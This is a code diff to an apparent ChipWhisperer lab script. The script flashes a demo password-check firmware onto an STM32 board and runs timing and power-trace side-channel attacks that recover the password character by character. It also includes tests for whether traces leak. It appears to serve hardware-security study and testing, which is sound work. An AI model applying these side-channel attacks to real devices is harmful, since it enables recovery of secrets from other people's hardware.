@@ -1,6 +1,9 @@
 import sys
+import string
+import random
 import chipwhisperer as cw
 from PATools import *
+from scipy.stats import pearsonr
 def reset():
   # reset scope and target
   st.target_clock = 24000000
@@ -26,33 +29,45 @@ def random_string(length=9):
 def random_bytes(length=9):
     return bytearray(random.getrandbits(8) for _ in range(length))
 def test():
-  (_,rx,_) = getone(random_bytes())
-  print("@flash",rx)
-  (_,rx,_) = getone(b"verysafe\x00")
-  print("@flash",rx)
+  (_,rx1,_) = getone(random_bytes())
+  (_,rx2,_) = getone(b"verysafe\x00")
+  if rx1 != b"Fail\x00" or rx2 != b"Pass\x00":
+    print("Failed at flash")
 def flash(fw):
   st.scope.default_setup()
   prog = cw.programmers.STM32FProgrammer
   cw.program_target(st.scope, prog, fw)
   reset()
   test()
-def attack_nopower(neg=False):
+def corroff(trc,pat):
+    # calculate offset of pattern in the trace where correlation is maximized
+    # i.e. approximate position of pattern in trace
+    i = 0
+    c = 0
+    for o in range(trc.size-pat.size):
+        x, _ = pearsonr(pat,trc[o:o+pat.size])
+        if x>c:
+            i = o
+            c = x
+    return (i,c)
+def attack_nopower():
+  print("Running: attack_withpower\n")
   succ=b"Pass\x00"
   pref=b""
   suff=b"xxxxxxxx\x00"
   chrs=list(string.ascii_lowercase) # + string.ascii_uppercase + string.digits)
-  (trc,_,_) = getone(st,suff)
+  (trc,_,_) = getone(suff)
   off = st.scope.adc.trig_count
   for i in trange(0,8):
     found = False
     for c in chrs:
       tx = pref + c.encode('utf-8') + suff[i+1:]
-      (trc,rx,_) = getone(st,tx)
+      (trc,rx,_) = getone(tx)
       soff = st.scope.adc.trig_count
       if rx==succ:
         print("Found pswd:",tx)
         return True
-      elif (neg and soff < off) or (not neg and soff > off):
+      elif soff < off:
         off  = soff
         pref = pref+c.encode('utf-8')
         print("Found byte:",pref)
@@ -61,23 +76,26 @@ def attack_nopower(neg=False):
     if not found:
       print("Could not find byte at offset:",i)
       return False
-def attack_withpower(pattern):
+def attack_withpower():
+  print("Running: attack_withpower\n")
+  (trc,_,_) = getone(random_bytes())
+  patt = trc[-100:]
   succ="Pass\x00".encode('utf-8')
   pref="".encode('utf-8')
   suff="xxxxxxxx\x00".encode('utf-8')
   chrs=list(string.ascii_lowercase) # + string.ascii_uppercase + string.digits)
-  (trc,_,_) = getone(st,suff)
-  off=corroff(trc,pattern)[0]
+  (trc,_,_) = getone(suff)
+  off=corroff(trc,patt)[0]
   for i in trange(0,8):
     found = False
     for c in chrs:
       tx = pref + c.encode('utf-8') + suff[i+1:]
-      (trc,rx,_) = getone(st,tx)
-      soff = corroff(trc,pattern)[0]
+      (trc,rx,_) = getone(tx)
+      soff = corroff(trc,patt)[0]
       if rx==succ:
         print("Found pswd:",tx)
         return True
-      elif soff > off:
+      elif soff < off:
         off  = soff
         pref = pref+c.encode('utf-8')
         print("Found byte:",pref)
@@ -91,27 +109,38 @@ def test_nopower(secr,pswd):
   off1 = st.scope.adc.trig_count
   (_,_,_) = getone(pswd)
   off2 = st.scope.adc.trig_count
-  print("Offsets:",off1,off2)
   if off1==off2:
-    print("Test Pass")
+    print("test_nopower: Passed")
     return 0
-  print("Test Fail")
+  print("test_nopower: Failed ", off1, off2)
   return 1
-def test_withpower(secr,pswd,patt):
+def test_withpower(secr,pswd):
+  (trc,_,_) = getone(pswd)
+  patt = trc[-100:]
   (trc,_,_) = getone(secr)
   off1 = corroff(trc,patt)[0]
   (trc,_,_) = getone(pswd)
   off2 = corroff(trc,patt)[0]
-  print("Offsets:",off1,off2)
   if off1==off2:
-    print("Test Pass")
+    print("test_withpower Passed")
     return 0
-  print("Test Fail")
+  print("test_withpower: Failed",off1,off2)
   return 1
 
 st = ScopeTarget((), (cw.targets.SimpleSerial,))
 flash('./simplepass-CW308_STM32F3.hex')
 
-secr = "verysafe\x00".encode('utf-8')
-pswd = "xxxxxxxx\x00".encode('utf-8')
-sys.exit(test_nopower(secr,pswd))
+secr = b"verysafe\x00"
+pswd = b"xxxxxxxx\x00"
+
+
+print("\nRunning Attacks")
+attack_withpower()
+attack_nopower()
+
+print("\nRunning Tests")
+ret  = 0
+ret += test_withpower(secr,pswd)
+ret += test_nopower(secr,pswd)
+sys.exit(ret)
+
